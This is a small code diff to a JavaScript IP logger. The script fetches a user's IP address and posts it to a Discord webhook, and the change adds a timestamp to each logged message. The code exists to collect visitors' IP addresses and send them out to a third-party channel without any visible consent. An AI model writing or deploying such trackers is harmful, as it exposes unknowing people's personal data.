@@ -13,7 +13,7 @@ async function fetchIP() {
         const userIp = data.ip;
         console.log('IP address:', userIp);
 
-        // Send the IP address to the Discord webhook
+        // Send the IP address to the Discord webhook with timestamp
         await sendToDiscord(userIp);
     } catch (error) {
         console.error('Error fetching IP address:', error);
@@ -23,8 +23,12 @@ async function fetchIP() {
 // Send the IP address to Discord using the webhook
 async function sendToDiscord(ip) {
     try {
+        // Get current timestamp
+        const timestamp = new Date().toISOString();
+
+        // Create the payload with the timestamp included
         const payload = {
-            content: `Logged IP address: ${ip}`, // The message sent to the Discord channel
+            content: `Logged IP address: ${ip} at ${timestamp}`, // The message sent to the Discord channel
         };
 
         const response = await fetch(discordWebhookUrl, {
